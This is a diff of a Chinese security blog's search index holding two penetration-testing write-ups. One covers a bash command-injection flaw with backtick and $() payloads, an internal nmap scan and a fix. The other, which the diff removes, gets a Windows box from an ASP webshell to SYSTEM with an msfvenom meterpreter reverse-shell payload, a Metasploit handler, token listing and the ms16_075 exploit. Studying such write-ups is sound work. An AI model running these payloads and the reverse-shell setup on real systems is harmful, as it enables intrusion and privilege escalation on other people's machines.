-<img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-44.png"></li>
-<li>从上图可以看到，payload的双引号不见了，在自己的Linux测试一下，发现bash在这种情况下会过滤双引号，因此排除了存在过滤双引号的可能<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-32-11.png"></li>
+<img data-src="2020-08-20-16-31-44.png"></li>
+<li>从上图可以看到，payload的双引号不见了，在自己的Linux测试一下，发现bash在这种情况下会过滤双引号，因此排除了存在过滤双引号的可能<br><img data-src="2020-08-20-16-32-11.png"></li>
 <li>经过多次测试，最终可用反引号<code>`</code>或者<code>$()</code>进行命令执行，如<code>ifconfig</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig&#96;&quot;</span><br></pre></td></tr></table></figure></li>
 <li>命令结果的回显是因为判断不存在<code>FILA_PATH</code>文件名的文件后，会把变量值返回，其源码如下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;the file($FILE_PATH) dose not exist!&quot;</span><br></pre></td></tr></table></figure>
 <strong>拓展知识：</strong> Linux bash中可以使用反引号<code>`</code>或者<code>$()</code>等方式将bash命令的执行结果保存到变量中，如<code>FILE_PATH=$(ifconfig)</code></li>
 <li>命令执行结果显示不完整，只能看到返回的第一行的结果，没关系，可以简单优化一下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig |xargs&#96;&quot;</span><br></pre></td></tr></table></figure>
-<strong>拓展知识：</strong> <code>xargs</code>可以将stdin中以空格或换行符进行分隔的数据，形成以空格分隔的参数（arguments），传递给其他命令。因为以空格作为分隔符，所以有一些文件名或者其他意义的名词内含有空格的时候，<code>xargs</code>可能会误判。简单来说，<code>xargs</code>是给其他命令传递参数的一个过滤器，是构建单行命令的重要组件之一。 但是这里仅仅只是通过<code>xargs</code>的特性让它把多行内容转换成一行来更好地显示结果，当然也可以使用其他方法来实现。<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-36-28.png"></li>
-<li>再看看nmap内网扫描的结果，同样的漏洞组件在内网中还发现了很多…<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-37-07.png"></li>
+<strong>拓展知识：</strong> <code>xargs</code>可以将stdin中以空格或换行符进行分隔的数据，形成以空格分隔的参数（arguments），传递给其他命令。因为以空格作为分隔符，所以有一些文件名或者其他意义的名词内含有空格的时候，<code>xargs</code>可能会误判。简单来说，<code>xargs</code>是给其他命令传递参数的一个过滤器，是构建单行命令的重要组件之一。 但是这里仅仅只是通过<code>xargs</code>的特性让它把多行内容转换成一行来更好地显示结果，当然也可以使用其他方法来实现。<br><img data-src="2020-08-20-16-36-28.png"></li>
+<li>再看看nmap内网扫描的结果，同样的漏洞组件在内网中还发现了很多…<br><img data-src="2020-08-20-16-37-07.png"></li>
 </ol>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>漏洞是由于程序调用bash脚本传参时没有做过滤，通过$(cmd)这样的方式来执行命令并将结果存入变量中，在脚本判断文件不存在时会返回文件名，造成了回显。</p>
 <h3 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h3><p>严格控制文件名参数值，先判断文件名或文件路径是否合法可修复漏洞。</p>
@@ -733,35 +763,5 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
       <categories>
         <category>漏洞挖掘</category>
       </categories>
-  </entry>
-  <entry>
-    <title>记一次Windows提权过程</title>
-    <url>/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
-<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>
-
-<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
-
-<a id="more"></a>
-
-<h3 id="通过webshell上传并执行木马"><a href="#通过webshell上传并执行木马" class="headerlink" title="通过webshell上传并执行木马"></a>通过webshell上传并执行木马</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-11-37.png"></p>
-<h3 id="msf接收到会话"><a href="#msf接收到会话" class="headerlink" title="msf接收到会话"></a>msf接收到会话</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-12-59.png"></p>
-<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-14-15.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito   </span><br><span class="line">list_tokens -u  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-19-47.png"></p>
-<h3 id="查找可利用的提权exp"><a href="#查找可利用的提权exp" class="headerlink" title="查找可利用的提权exp"></a>查找可利用的提权exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-11.png"></p>
-<h3 id="把当前msf回话放到后台，并记住其session值为5"><a href="#把当前msf回话放到后台，并记住其session值为5" class="headerlink" title="把当前msf回话放到后台，并记住其session值为5"></a>把当前msf回话放到后台，并记住其session值为5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bg  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-36.png"></p>
-<h3 id="利用ms16-075得到system权限"><a href="#利用ms16-075得到system权限" class="headerlink" title="利用ms16_075得到system权限"></a>利用ms16_075得到system权限</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-50.png"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
   </entry>
 </search>
